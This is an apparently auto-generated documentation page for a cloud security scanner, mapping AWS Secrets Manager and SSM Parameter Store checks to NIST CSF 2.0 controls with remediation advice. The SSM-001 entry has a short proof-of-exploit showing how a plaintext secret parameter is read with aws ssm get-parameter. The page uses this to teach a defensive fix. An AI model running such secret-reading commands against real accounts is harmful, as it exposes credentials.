**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** A wildcard-principal Allow on a Secrets Manager resource policy means any principal in any AWS account can call ``GetSecretValue`` (subject to conditions, if any). Always combine with at least ``aws:SourceAccount`` or ``aws:PrincipalOrgID``, the lift-and-shift cross-account secret-access pattern needs scoping.

**Recommendation.** Remove Allow statements whose Principal is ``*`` from every Secrets Manager resource policy, or scope them with a ``Condition`` restricting the source account/org (``aws:PrincipalOrgID``). A wildcard-principal policy allows any AWS account to call ``GetSecretValue`` on the secret.

**Source:** [`SM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SSM-001`: SSM Parameter with secret-like name is not a SecureString <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ssm-001 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** An SSM ``String`` parameter is plaintext at rest and at API; ``ssm:GetParameter`` without any KMS Decrypt authority returns the value. ``SecureString`` adds KMS-encryption + the ``WithDecryption=true`` flag (which forces an explicit KMS authorization step). Secret-named parameters (``TOKEN``, ``PASSWORD``, ``KEY``) are almost always intended to be SecureString and rarely should not be.

**Recommendation.** Recreate the parameter with ``Type=SecureString`` and migrate consumers to the new name if needed. Plain ``String`` parameters are visible via ``ssm:GetParameter`` without any KMS authorization.

**Proof of exploit.**

# Vulnerable: secret-named parameter stored as plain ``String``.
$ aws ssm put-parameter \
    --name /prod/api/GITHUB_TOKEN \
    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
    --type String

# Attack: any principal with the minimal ``ssm:GetParameter``
# permission reads the cleartext, no KMS authorization needed:
#
#   aws ssm get-parameter --name /prod/api/GITHUB_TOKEN
#   # Returns the plaintext, even for principals with
#   # ``kms:Decrypt`` explicitly denied account-wide.
#
# CloudTrail records the GetParameter call but not the value;
# defenders see the access only by name + principal, not what
# was read.

# Safe: SecureString forces a separate KMS authorization step.
$ aws ssm put-parameter \
    --name /prod/api/GITHUB_TOKEN \
    --value ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
    --type SecureString \
    --key-id alias/prod-secrets

# Now readers need BOTH ``ssm:GetParameter`` AND ``kms:Decrypt``
# on the named CMK, and the call only returns plaintext when
# ``WithDecryption=true`` is set (an explicit, auditable opt-in).

**Source:** [`SSM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SSM-002`: SSM SecureString uses the default AWS-managed key <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ssm-002 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** ``alias/aws/ssm`` is the AWS-managed default for SecureString. Its key policy is fixed and account-wide. A customer-managed key gives you the same per-parameter key-policy + CloudTrail audit story you'd apply to Secrets Manager (which always uses a CMK).

**Recommendation.** Recreate SecureString parameters with ``KeyId`` pointing at a customer-managed KMS key. The default ``alias/aws/ssm`` key is shared across the account and its key policy cannot be audited or scoped per parameter.

**Source:** [`SSM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

---

_This page is generated. Edit `pipeline_check/core/standards/data/nist_csf_2.py` (mappings) or `scripts/gen_standards_docs.py` (intro / per-control prose) and run `python scripts/gen_standards_docs.py nist_csf_2`._
